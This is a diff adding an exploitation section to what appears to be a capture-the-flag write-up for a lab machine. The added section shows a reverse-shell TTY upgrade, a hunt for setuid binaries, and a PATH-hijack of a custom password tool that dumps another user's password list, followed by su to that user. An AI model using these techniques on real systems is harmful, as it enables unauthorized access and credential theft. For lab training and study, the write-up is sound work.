@@ -222,3 +222,150 @@ bash: cannot set terminal process group (809): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@ip-10-80-133-47:/var/www/files.lookup.thm/public_html$ 
 ```
+
+## Exploitation
+https://0xffsec.com/handbook/shells/full-tty/
+rev-shell have limited interactive capabilities, becouse of that we can upgrate it like that:
+
+```
+[ Oguri ~ ]$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.80.132.187 56190
+bash: cannot set terminal process group (806): Inappropriate ioctl for device
+bash: no job control in this shell
+<var/www/files.lookup.thm/public_html/elFinder/php$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<hp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<var/www/files.lookup.thm/public_html/elFinder/php$ ^Z
+[1]+  Stopped                    nc -lvnp 9001
+[ Oguri ~ ]$ stty raw -echo && fg
+nc -lvnp 9001
+             s  
+s: command not found
+<var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
+www-data@ip-10-80-132-187:/home$ 
+```
+
+```
+www-data@ip-10-80-132-187:/home/think$ find / -perm /4000 2>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+^C
+```
+
+
+```
+www-data@ip-10-80-132-187:/usr/sbin$ file /usr/sbin/pwm
+/usr/sbin/pwm: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01ec8570b00af8889beebc5f93c6d56fb9cc1083, for GNU/Linux 3.2.0, not stripped
+www-data@ip-10-80-132-187:/usr/sbin$ pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@ip-10-80-132-187:/usr/sbin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+```
+www-data@ip-10-80-132-187:/usr/sbin$ cd /tmp
+www-data@ip-10-80-132-187:/tmp$ echo 'echo "uid=1000(think)"' > id
+www-data@ip-10-80-132-187:/tmp$ cat id                            
+echo "uid=1000(think)"
+www-data@ip-10-80-132-187:/tmp$ chmod +x id
+www-data@ip-10-80-132-187:/tmp$ ./id 
+uid=1000(think)
+www-data@ip-10-80-132-187:/tmp$ export PATH=/tmp:$PATH
+www-data@ip-10-80-132-187:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@ip-10-80-132-187:/tmp$ id
+uid=1000(think)
+```
+
+```
+www-data@ip-10-80-132-187:/tmp$ pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+XXX
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+```
+
+```
+www-data@ip-10-80-132-187:/tmp$ su think
+Password: 
+think@ip-10-80-132-187:/tmp$ cd
+think@ip-10-80-132-187:~$ ls
+user.txt
+think@ip-10-80-132-187:~$ cat user.txt 
+XXX
+```
